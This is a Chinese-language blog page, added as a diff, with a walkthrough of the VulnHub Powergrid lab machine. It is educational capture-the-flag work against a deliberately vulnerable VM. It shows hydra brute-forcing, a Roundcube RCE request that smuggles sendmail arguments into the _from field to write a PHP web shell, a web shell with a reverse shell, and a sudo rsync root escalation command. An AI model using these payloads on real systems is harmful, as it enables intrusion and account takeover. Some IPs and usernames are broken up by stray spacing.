@@ -1,0 +1,670 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="X_T" href="http://n1h1l157.github.io/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="X_T" href="http://n1h1l157.github.io/atom.xml" />
+<link rel="alternate" type="application/json" title="X_T" href="http://n1h1l157.github.io/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="VULNHUB 41-50" />
+
+
+<link rel="canonical" href="http://n1h1l157.github.io/2023/07/01/VULNHUB/150%20POWERGRID/">
+
+
+
+  <title>
+VULNHUB POWERGRID - VULNHUB |
+Phut Hon = X_T = 天行健，君子以自强不息</title>
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">VULNHUB POWERGRID
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2023-07-01 14:06:58">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2023-07-01T14:06:58+08:00">2023-07-01</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">Phut Hon</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/PCwuTAfIR1Bnpkz.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/N9BJsPE7YgiVhTM.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/DZRlqjoQg3XAKsz.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/QAxBIPapd1h6mvD.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/2fd4OmPLVlHYoaK.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/NAc3EBhzxTbRiuQ.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/VULNHUB/" itemprop="item" rel="index" title="分类于 VULNHUB"><span itemprop="name">VULNHUB</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="http://n1h1l157.github.io/2023/07/01/VULNHUB/150%20POWERGRID/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content=".N1h1l157">
+    <meta itemprop="description" content="天行健，君子以自强不息, 人生如逆旅，我亦是行人">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="X_T">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <p>靶机下载地址: <span class="exturl" data-url="aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvcG93ZXJncmlkLTEwMSw0ODUv">https://www.vulnhub.com/entry/powergrid-101,485/</span><br>
+ 教程链接地址: <span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pvbmFoX0JhcmUvYXJ0aWNsZS9kZXRhaWxzLzEwNjk2MTQ3Nw==">https://blog.csdn.net/Jonah_Bare/article/details/106961477</span><br>
+<span class="exturl" data-url="aHR0cHM6Ly93d3cuaGFja2luZ2FydGljbGVzLmluL3Bvd2VyZ3JpZC0=">https://www.hackingarticles.in/powergrid-</span> 1 - 0 - 1 - vulnhub-walkthrough/</p>
+<h3 id="001-确认攻击目标的财产信息"><a class="markdownIt-Anchor" href="#001-确认攻击目标的财产信息">#</a> 001 确认攻击目标的财产信息</h3>
+<p>攻击机 kali： 1 92.168. 0 .x (由于设置成了 DHCP、可能多变)<br>
+ 靶机 POWERGRID：桥接于 1 92.168. 0 .1 的网卡，ip 未知</p>
+<p>1 ）确定靶机 ip 地址和开放的端口<br>
+由已至内网靶机所在主机 MAC 地址自动扫描靶机 ip<br>
+sudo arp-scan -l | grep ‘a0’ | awk ‘{print $1,$2}’ | cut -d ’ ’ -f 1 | uniq</p>
+<p>sudo arp-scan -l | grep ‘a0’ | awk ‘{print $1,$2}’ | cut -d ’ ’ -f 1 | xargs sudo nmap -PA</p>
+<p>sudo nmap -sVC -T4 -Pn --open -p- 192.168.0.1 90 --min-rate=5000</p>
+<h3 id="002-信息收集http-get爆破拿到后台权限"><a class="markdownIt-Anchor" href="#002-信息收集http-get爆破拿到后台权限">#</a> 002 信息收集，http-get 爆破，拿到后台权限</h3>
+<p>打开 <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjgu">http://192.168.</span> 0. 190 / 进行信息收集</p>
+<p>收集到了三个用户名 deez 1 、p 48 和 all 2</p>
+<p>用 common.txt 字典扫了一波，没有扫到有价值的信息</p>
+<p>换了个字典扫了一波，扫到了一个 zmail 的目录</p>
+<h3 id="访问之后得到了一个登陆页面"><a class="markdownIt-Anchor" href="#访问之后得到了一个登陆页面">#</a> 访问之后得到了一个登陆页面</h3>
+<p><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMC4xOTAvem1haWw=">http://192.168.0.190/zmail</span></p>
+<h3 id="由于已经有了三个用户名了是有机会爆破得到密码的"><a class="markdownIt-Anchor" href="#由于已经有了三个用户名了是有机会爆破得到密码的">#</a> 由于已经有了三个用户名了，是有机会爆破得到密码的</h3>
+<p>选择模式为 http-get，选取密码为 rockyou.txt 开始爆破<br>
+ hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 192.168.0.190 - f http-get /zmail/</p>
+<ul>
+<li>t 64 -f -vV -o hydra.ssh</li>
+</ul>
+<h3 id="第一个用户爆破了-18-万次了还是没有爆破成功等的有点着急让这个继续爆"><a class="markdownIt-Anchor" href="#第一个用户爆破了-18-万次了还是没有爆破成功等的有点着急让这个继续爆">#</a> 第一个用户爆破了 18 万次了还是没有爆破成功，等的有点着急，让这个继续爆</h3>
+<p>破下起，同时在启一个 terminal 跑另外一个爆破选择第二个用户</p>
+<p>hydra -l p48 -P /usr/share/wordlists/rockyou.txt 192.168.0.190 - f http-get /zmail/ -t 64</p>
+<ul>
+<li>f -vV -o hydra.ssh</li>
+</ul>
+<p>在爆破到 12 万次的时候，得到了 p 48 的密码 electrico</p>
+<p>一个后台登陆地址，再次用 p 4 8:electrico 登陆到其中成功</p>
+<h3 id="登陆成功得到一个邮箱的后台界面"><a class="markdownIt-Anchor" href="#登陆成功得到一个邮箱的后台界面">#</a> 登陆成功，得到一个邮箱的后台界面</h3>
+<h3 id="003-roundcube邮件系统searchsploit利用antsword使用"><a class="markdownIt-Anchor" href="#003-roundcube邮件系统searchsploit利用antsword使用">#</a> 003 roundcube 邮件系统，searchsploit 利用，antsword 使用</h3>
+<h3 id="有一封邮件看起来比较重要看一下什么意思"><a class="markdownIt-Anchor" href="#有一封邮件看起来比较重要看一下什么意思">#</a> 有一封邮件，看起来比较重要，看一下什么意思</h3>
+<p>就是有一个 gpg 加密后的 ssh 私钥文件，解开此私钥文件即可登陆 p 48</p>
+<p>找了一圈没有找到 roundcude 的版本，直接用 searchsploit 搜索一波</p>
+<h3 id="将此rce漏洞说明文件复制到本地开始阅读尝试测试能否突破"><a class="markdownIt-Anchor" href="#将此rce漏洞说明文件复制到本地开始阅读尝试测试能否突破">#</a> 将此 RCE 漏洞说明文件复制到本地，开始阅读，尝试测试能否突破</h3>
+<p>阅读后发现需要将 from 改为 example@example.com -OQueueDirectory=/tmp -<br>
+X/var/www/html/rce.php，从_subject 参数中获取到 rce.php 脚本的内容</p>
+<p>在后台中开是发送邮件，并且把数据拦截到 burp<br>
+ 利用 burp 抓包，可以看到原始数据包有很多参数</p>
+<p>伪造参数内容如下，其中 token 需要和自己抓到的数据的 token 一致<br>
+_token=krpJ9hLHabsYEAGsS98ipIVLRBfwHXwU&amp;_task=mail&amp;_action=send&amp;_id=11315<br>
+<span class="exturl" data-url="bWFpbHRvOjQ4ODAwNjJmNzBjNWE5MGUxNiZhbXA7X2F0dGFjaG1lbnRzPSZhbXA7X2Zyb209ZXhhbXBsZUBleGFtcGxlLmNvbQ==">4880062f70c5a90e16&amp;_attachments=&amp;_from=example@example.com</span> -<br>
+OQueueDirectory=/tmp -<br>
+X/var/www/html/rce.php&amp;_to=sssssss%<span class="exturl" data-url="aHR0cDovLzQwcXEuY29t">40qq.com</span>&amp;_cc=&amp;_bcc=&amp;_replyto=&amp;_followupto=<br>
+&amp;_subject=&lt;?php<br>
+phpinfo();?&gt;&amp;editorSelector=plain&amp;_priority=0&amp;_store_target=Sent&amp;_draft_saveid=&amp;_draft<br>
+=&amp;_is_html=0&amp;_framed=1&amp;_message=aaa</p>
+<p>页面访问发现没有看到 rce.php 的代码，但是不是 not found 的提示，说明我<br>
+们已经成功的上传上去了一个后门</p>
+<h3 id="其他没有任何信息的页面应该是如下内容"><a class="markdownIt-Anchor" href="#其他没有任何信息的页面应该是如下内容">#</a> 其他没有任何信息的页面应该是如下内容</h3>
+<p>这次直接写一个 post 的一句话后门，可用 antsword 连接</p>
+<p>连接成功后门，可以继续往此后门中写入反弹 shell 的代码</p>
+<p>写入 mkfifo 构造好的反弹 shell 的代码并保存</p>
+<p>用 curl 执行的同时，用来监听这个端口等到接收反弹 shell</p>
+<h3 id="004-gpg文件解密pgptool使用通过docker容器提权"><a class="markdownIt-Anchor" href="#004-gpg文件解密pgptool使用通过docker容器提权">#</a> 004 gpg 文件解密，pgptool 使用，通过 docker 容器提权</h3>
+<p>发现有 p 48 这个用户，切换后输入 electrico 即可切换成功</p>
+<p>发现了一个 gpg 的私钥文件，看来就是邮件系统中提醒我们用来解开 gpg 加密<br>
+后的 ssh 密钥的一个密匙</p>
+<p>有一个非常好的解密 gpg 的工具<br>
+<span class="exturl" data-url="aHR0cHM6Ly9wZ3B0b29sLmdpdGh1Yi5pby8="> https://pgptool.github.io/</span></p>
+<p>下载好一个 jar 包，选取解密模块，将邮件系统中的 gpg 导入</p>
+<p>提示需要一个密码，输入 p 48 的密码 electrico</p>
+<h3 id="输入解密成功之后导出的文件的位置"><a class="markdownIt-Anchor" href="#输入解密成功之后导出的文件的位置">#</a> 输入解密成功之后导出的文件的位置</h3>
+<p>解密成功得到了一个 ssh 的私钥文件</p>
+<p>没有用到在用户目录下得到的密匙文件，但是照样把这个 key 得到了，这个<br>
+ key 理论上是可以登陆到 p 48 用户的，但是需要注意的是，靶机上没有开放 ssh<br>
+ 端口，那我们应该怎么连呢</p>
+<p>先把这个文件给 echo 到靶机上，并且改变私钥文件的权限</p>
+<p>注意到当前靶机的 ip 地址中有 dokcer 网卡，既然靶机上没有开放 ssh 端口无<br>
+法通过 p 48 的密钥接入到 p 48 用户上，那么是不是可以先用私钥文件进到一台<br>
+开通了 ssh 协议的 docker 容器中呢，就试试看</p>
+<p>测试一下出了 1 72.17.0.1 的网关地址之外，存活的 docker 主机，找到一台<br>
+ 172 .17.0.2 是存活主机</p>
+<p>ssh <span class="exturl" data-url="bWFpbHRvOnA0OEAxNzIuMTcuMC4y">p48@172.17.0.2</span> -i id_rsa</p>
+<p>成功进入到了 docker 容器内部，用的 p 48 这个用户进去的，看 hostname 像是在<br>
+ docker 容器内部，而且有 sudo 权限设置错误，可以直接调用 root 的 rsync<br>
+sudo rsync -e ‘sh -c “sh 0&lt;&amp;2 1&gt;&amp;2”’ 127.0.0.1:/dev/null</p>
+<p>提权到了 root 之后，由于我们还在 docker 内部，ip 也只有一个本地回环地址<br>
+和一个 docker 虚拟出来的 ip，但是我们可以与 docker 的网关地址，即宿主机<br>
+直接通信，连接到 1 72.17.0.1 就相当于连接到了宿主机，而我们在 docker 内<br>
+部连的时候是不需要外部开通 22 端口的<br>
+ ssh <span class="exturl" data-url="bWFpbHRvOnJvb3RAMTcyLjE3LjAuMQ==">root@172.17.0.1</span></p>
+<p>成功拿到了 root 权限，并且查看到 ip 已经恢复到了宿主机的 ip</p>
+
+      <div class="tags">
+          <a href="/tags/VULNHUB-41-50/" rel="tag"><i class="ic i-tag"></i> VULNHUB 41-50</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2023-07-01 14:28:55" itemprop="dateModified" datetime="2023-07-01T14:28:55+08:00">2023-07-01</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> 赞赏</button>
+  <p>请我喝[茶]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt=".N1h1l157 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt=".N1h1l157 支付宝">
+        <p>支付宝</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt=".N1h1l157 贝宝">
+        <p>贝宝</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>.N1h1l157 <i class="ic i-at"><em>@</em></i>X_T
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="http://n1h1l157.github.io/2023/07/01/VULNHUB/150%20POWERGRID/" title="VULNHUB POWERGRID">http://n1h1l157.github.io/2023/07/01/VULNHUB/150 POWERGRID/</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2023/07/01/VULNHUB/149%20DURIAN/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;8LkEDulrcA3wvsa.jpg" title="VULNHUB DURIAN">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> VULNHUB</span>
+  <h3>VULNHUB DURIAN</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2023/07/01/VULNHUB/148%20GITROOT/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;brPBKf6e7oSkgvO.jpg" title="VULNHUB GITROOT">
+  <span class="type">下一篇</span>
+  <span class="category"><i class="ic i-flag"></i> VULNHUB</span>
+  <h3>VULNHUB GITROOT</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#001-%E7%A1%AE%E8%AE%A4%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87%E7%9A%84%E8%B4%A2%E4%BA%A7%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text"> 001 确认攻击目标的财产信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#002-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86http-get%E7%88%86%E7%A0%B4%E6%8B%BF%E5%88%B0%E5%90%8E%E5%8F%B0%E6%9D%83%E9%99%90"><span class="toc-number">2.</span> <span class="toc-text"> 002 信息收集，http-get 爆破，拿到后台权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E4%B9%8B%E5%90%8E%E5%BE%97%E5%88%B0%E4%BA%86%E4%B8%80%E4%B8%AA%E7%99%BB%E9%99%86%E9%A1%B5%E9%9D%A2"><span class="toc-number">3.</span> <span class="toc-text"> 访问之后得到了一个登陆页面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%B1%E4%BA%8E%E5%B7%B2%E7%BB%8F%E6%9C%89%E4%BA%86%E4%B8%89%E4%B8%AA%E7%94%A8%E6%88%B7%E5%90%8D%E4%BA%86%E6%98%AF%E6%9C%89%E6%9C%BA%E4%BC%9A%E7%88%86%E7%A0%B4%E5%BE%97%E5%88%B0%E5%AF%86%E7%A0%81%E7%9A%84"><span class="toc-number">4.</span> <span class="toc-text"> 由于已经有了三个用户名了，是有机会爆破得到密码的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E7%88%86%E7%A0%B4%E4%BA%86-18-%E4%B8%87%E6%AC%A1%E4%BA%86%E8%BF%98%E6%98%AF%E6%B2%A1%E6%9C%89%E7%88%86%E7%A0%B4%E6%88%90%E5%8A%9F%E7%AD%89%E7%9A%84%E6%9C%89%E7%82%B9%E7%9D%80%E6%80%A5%E8%AE%A9%E8%BF%99%E4%B8%AA%E7%BB%A7%E7%BB%AD%E7%88%86"><span class="toc-number">5.</span> <span class="toc-text"> 第一个用户爆破了 18 万次了还是没有爆破成功，等的有点着急，让这个继续爆</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BB%E9%99%86%E6%88%90%E5%8A%9F%E5%BE%97%E5%88%B0%E4%B8%80%E4%B8%AA%E9%82%AE%E7%AE%B1%E7%9A%84%E5%90%8E%E5%8F%B0%E7%95%8C%E9%9D%A2"><span class="toc-number">6.</span> <span class="toc-text"> 登陆成功，得到一个邮箱的后台界面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#003-roundcube%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9Fsearchsploit%E5%88%A9%E7%94%A8antsword%E4%BD%BF%E7%94%A8"><span class="toc-number">7.</span> <span class="toc-text"> 003 roundcube 邮件系统，searchsploit 利用，antsword 使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E4%B8%80%E5%B0%81%E9%82%AE%E4%BB%B6%E7%9C%8B%E8%B5%B7%E6%9D%A5%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9C%8B%E4%B8%80%E4%B8%8B%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D"><span class="toc-number">8.</span> <span class="toc-text"> 有一封邮件，看起来比较重要，看一下什么意思</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%86%E6%AD%A4rce%E6%BC%8F%E6%B4%9E%E8%AF%B4%E6%98%8E%E6%96%87%E4%BB%B6%E5%A4%8D%E5%88%B6%E5%88%B0%E6%9C%AC%E5%9C%B0%E5%BC%80%E5%A7%8B%E9%98%85%E8%AF%BB%E5%B0%9D%E8%AF%95%E6%B5%8B%E8%AF%95%E8%83%BD%E5%90%A6%E7%AA%81%E7%A0%B4"><span class="toc-number">9.</span> <span class="toc-text"> 将此 RCE 漏洞说明文件复制到本地，开始阅读，尝试测试能否突破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%B2%A1%E6%9C%89%E4%BB%BB%E4%BD%95%E4%BF%A1%E6%81%AF%E7%9A%84%E9%A1%B5%E9%9D%A2%E5%BA%94%E8%AF%A5%E6%98%AF%E5%A6%82%E4%B8%8B%E5%86%85%E5%AE%B9"><span class="toc-number">10.</span> <span class="toc-text"> 其他没有任何信息的页面应该是如下内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#004-gpg%E6%96%87%E4%BB%B6%E8%A7%A3%E5%AF%86pgptool%E4%BD%BF%E7%94%A8%E9%80%9A%E8%BF%87docker%E5%AE%B9%E5%99%A8%E6%8F%90%E6%9D%83"><span class="toc-number">11.</span> <span class="toc-text"> 004 gpg 文件解密，pgptool 使用，通过 docker 容器提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%85%A5%E8%A7%A3%E5%AF%86%E6%88%90%E5%8A%9F%E4%B9%8B%E5%90%8E%E5%AF%BC%E5%87%BA%E7%9A%84%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%8D%E7%BD%AE"><span class="toc-number">12.</span> <span class="toc-text"> 输入解密成功之后导出的文件的位置</span></a></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+        <ul>
+          <li><a href="/2023/07/01/VULNHUB/101%20EVM/" rel="bookmark" title="VULNHUB 1 EVM">VULNHUB 1 EVM</a></li><li><a href="/2023/07/01/VULNHUB/102%20NAPPING/" rel="bookmark" title="VULNHUB 2 NAPPING">VULNHUB 2 NAPPING</a></li><li><a href="/2023/07/01/VULNHUB/103%20HACKSUDO/" rel="bookmark" title="VULNHUB 3 HACKSUDO">VULNHUB 3 HACKSUDO</a></li><li><a href="/2023/07/01/VULNHUB/104%20BREAKOUT/" rel="bookmark" title="VULNHUB 4 BREAKOUT">VULNHUB 4 BREAKOUT</a></li><li><a href="/2023/07/01/VULNHUB/105%20EARTH/" rel="bookmark" title="VULNHUB 5 EARTH">VULNHUB 5 EARTH</a></li><li><a href="/2023/07/01/VULNHUB/106%20SYMFONOS/" rel="bookmark" title="VULNHUB 6 SYMFONOS">VULNHUB 6 SYMFONOS</a></li><li><a href="/2023/07/01/VULNHUB/107%20RECON/" rel="bookmark" title="VULNHUB 7 RECON">VULNHUB 7 RECON</a></li><li><a href="/2023/07/01/VULNHUB/108%20MATRIX/" rel="bookmark" title="VULNHUB 8 MATRIX">VULNHUB 8 MATRIX</a></li><li><a href="/2023/07/01/VULNHUB/110%20RED/" rel="bookmark" title="VULNHUB 10 RED">VULNHUB 10 RED</a></li><li><a href="/2023/07/01/VULNHUB/111%20DEATHNOTE/" rel="bookmark" title="VULNHUB 11 DEATHNOTE">VULNHUB 11 DEATHNOTE</a></li><li><a href="/2023/07/01/VULNHUB/109%20WALLABY/" rel="bookmark" title="VULNHUB 9 WALLABY">VULNHUB 9 WALLABY</a></li><li><a href="/2023/07/01/VULNHUB/112%20THOTH/" rel="bookmark" title="VULNHUB 12 THOTH">VULNHUB 12 THOTH</a></li><li><a href="/2023/07/01/VULNHUB/113%20CHRONOS/" rel="bookmark" title="VULNHUB 13 CHRONOS">VULNHUB 13 CHRONOS</a></li><li><a href="/2023/07/01/VULNHUB/114%20ICA/" rel="bookmark" title="VULNHUB 14 ICA">VULNHUB 14 ICA</a></li><li><a href="/2023/07/01/VULNHUB/115%20THALES/" rel="bookmark" title="VULNHUB 15 THALES">VULNHUB 15 THALES</a></li><li><a href="/2023/07/01/VULNHUB/116%20LUPINONE/" rel="bookmark" title="VULNHUB 16 LUPINONE">VULNHUB 16 LUPINONE</a></li><li><a href="/2023/07/01/VULNHUB/117%20WEBMACHINE/" rel="bookmark" title="VULNHUB 17 WEBMACHINE">VULNHUB 17 WEBMACHINE</a></li><li><a href="/2023/07/01/VULNHUB/119%20THOR/" rel="bookmark" title="VULNHUB 19 THOR">VULNHUB 19 THOR</a></li><li><a href="/2023/07/01/VULNHUB/118%20JANGOW/" rel="bookmark" title="VULNHUB 18 JANGOW">VULNHUB 18 JANGOW</a></li><li><a href="/2023/07/01/VULNHUB/120%20BEELZEBUB/" rel="bookmark" title="VULNHUB 20 BEELZEBUB">VULNHUB 20 BEELZEBUB</a></li><li><a href="/2023/07/01/VULNHUB/121%20RIPPER/" rel="bookmark" title="VULNHUB RIPPER">VULNHUB RIPPER</a></li><li><a href="/2023/07/01/VULNHUB/122%20FUNBOX10/" rel="bookmark" title="VULNHUB FUNBOX10">VULNHUB FUNBOX10</a></li><li><a href="/2023/07/01/VULNHUB/123%20KEYRING/" rel="bookmark" title="VULNHUB KEYRING">VULNHUB KEYRING</a></li><li><a href="/2023/07/01/VULNHUB/124%20HACKABLELL/" rel="bookmark" title="VULNHUB HACKABLELL">VULNHUB HACKABLELL</a></li><li><a href="/2023/07/01/VULNHUB/127%20TYPO/" rel="bookmark" title="VULNHUB TYPO">VULNHUB TYPO</a></li><li><a href="/2023/07/01/VULNHUB/126%20HACKERKID/" rel="bookmark" title="VULNHUB HACKERKID">VULNHUB HACKERKID</a></li><li><a href="/2023/07/01/VULNHUB/125%20SNAKEOIL/" rel="bookmark" title="VULNHUB SNAKEOIL">VULNHUB SNAKEOIL</a></li><li><a href="/2023/07/01/VULNHUB/128%20BLUEMOON/" rel="bookmark" title="VULNHUB BLUEMOON">VULNHUB BLUEMOON</a></li><li><a href="/2023/07/01/VULNHUB/129%20PRESIDENTIAL/" rel="bookmark" title="VULNHUB PRESIDENTIAL">VULNHUB PRESIDENTIAL</a></li><li><a href="/2023/07/01/VULNHUB/131%20PROXIMACENTAURI/" rel="bookmark" title="VULNHUB PROXIMACENTAURI">VULNHUB PROXIMACENTAURI</a></li><li><a href="/2023/07/01/VULNHUB/132%20JETTY/" rel="bookmark" title="VULNHUB JETTY">VULNHUB JETTY</a></li><li><a href="/2023/07/01/VULNHUB/134%20GROTESQUE2/" rel="bookmark" title="VULNHUB GROTESQUE2">VULNHUB GROTESQUE2</a></li><li><a href="/2023/07/01/VULNHUB/136%20GROTESQUE1/" rel="bookmark" title="VULNHUB GROTESQUE1">VULNHUB GROTESQUE1</a></li><li><a href="/2023/07/01/VULNHUB/138%20BLUESOMKE/" rel="bookmark" title="VULNHUB BLUESOMKE">VULNHUB BLUESOMKE</a></li><li><a href="/2023/07/01/VULNHUB/139%20INFERNO/" rel="bookmark" title="VULNHUB INFERNO">VULNHUB INFERNO</a></li><li><a href="/2023/07/01/VULNHUB/137%20VENUS/" rel="bookmark" title="VULNHUB VENUS">VULNHUB VENUS</a></li><li><a href="/2023/07/01/VULNHUB/140%20LOOZ/" rel="bookmark" title="VULNHUB LOOZ">VULNHUB LOOZ</a></li><li><a href="/2023/07/01/VULNHUB/142%20DARKHOLE2/" rel="bookmark" title="VULNHUB DARKHOLE2">VULNHUB DARKHOLE2</a></li><li><a href="/2023/07/01/VULNHUB/143%20ORASI/" rel="bookmark" title="VULNHUB ORASI">VULNHUB ORASI</a></li><li><a href="/2023/07/01/VULNHUB/144%20CEREAL/" rel="bookmark" title="VULNHUB CEREAL">VULNHUB CEREAL</a></li><li><a href="/2023/07/01/VULNHUB/145%20TORANDO/" rel="bookmark" title="VULNHUB TORANDO">VULNHUB TORANDO</a></li><li><a href="/2023/07/01/VULNHUB/146%20NEMESIS/" rel="bookmark" title="VULNHUB NEMESIS">VULNHUB NEMESIS</a></li><li><a href="/2023/07/01/VULNHUB/148%20GITROOT/" rel="bookmark" title="VULNHUB GITROOT">VULNHUB GITROOT</a></li><li class="active"><a href="/2023/07/01/VULNHUB/150%20POWERGRID/" rel="bookmark" title="VULNHUB POWERGRID">VULNHUB POWERGRID</a></li><li><a 